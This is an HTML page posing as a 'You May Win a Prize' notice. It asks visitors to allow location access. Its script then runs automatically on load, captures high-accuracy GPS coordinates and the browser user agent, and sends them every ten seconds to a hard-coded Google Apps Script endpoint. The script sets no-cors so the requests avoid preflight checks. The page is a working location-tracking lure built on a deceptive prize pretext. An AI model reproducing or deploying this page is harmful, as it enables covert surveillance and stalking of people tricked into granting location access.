<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>You May Win a Prize</title>
  <style>
    body { font-family: sans-serif; padding: 16px; }
    #log { white-space: pre-wrap; font-family: monospace; font-size: 12px;
           background: #f4f4f4; padding: 8px; border-radius: 6px;
           max-height: 60vh; overflow: auto; }
    button { padding: 12px 18px; font-size: 16px; }
  </style>
</head>
<body>
  <h2>Congratualtions You May Win a Prize</h2>
  <p>Please allow location when prompted.</p>
  <div id="status">Starting...</div>
  <h3>Log</h3>
  <div id="log"></div>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzP5FPfucaAV02pV9dNWTfbZKPr94f3CGzKrh2cTddzXFC-Bg_VQYBieAkEk7qTC9Op/exec";

const statusEl = document.getElementById("status");
const logEl    = document.getElementById("log");

function log(msg) {
  const ts = new Date().toLocaleTimeString();
  logEl.textContent = "[" + ts + "] " + msg + "\n" + logEl.textContent;
  console.log(msg);
}
function setStatus(msg) { statusEl.textContent = msg; }

function sendLocation(position) {
  const data = {
    latitude:  position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy:  position.coords.accuracy,
    userAgent: navigator.userAgent,
    ts:        new Date().toISOString()
  };
  log("Got fix: " + data.latitude.toFixed(5) + ", " + data.longitude.toFixed(5)
      + " (\u00b1" + Math.round(data.accuracy) + "m). Sending...");

  // text/plain avoids a CORS preflight that Apps Script does not answer.
  // The server JSON.parse's the body.
  fetch(SCRIPT_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify(data)
  })
  .then(() => { log("POST sent."); setStatus("Last sent: " + new Date().toLocaleTimeString()); })
  .catch(err => log("POST error: " + err));
}

function geoError(err) {
  log("Geolocation error " + err.code + ": " + err.message);
  setStatus("Location error: " + err.message);
}

function getLocation() {
  if (!("geolocation" in navigator)) { log("Geolocation API not available."); return; }
  navigator.geolocation.getCurrentPosition(
    sendLocation,
    geoError,
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

// Auto-start: fire as soon as the page loads.
window.addEventListener("load", () => {
  setStatus("Requesting location permission...");
  log("Page loaded. Starting auto-capture.");
  getLocation();
  setInterval(getLocation, 10000);
});
</script>

</body>
</html>
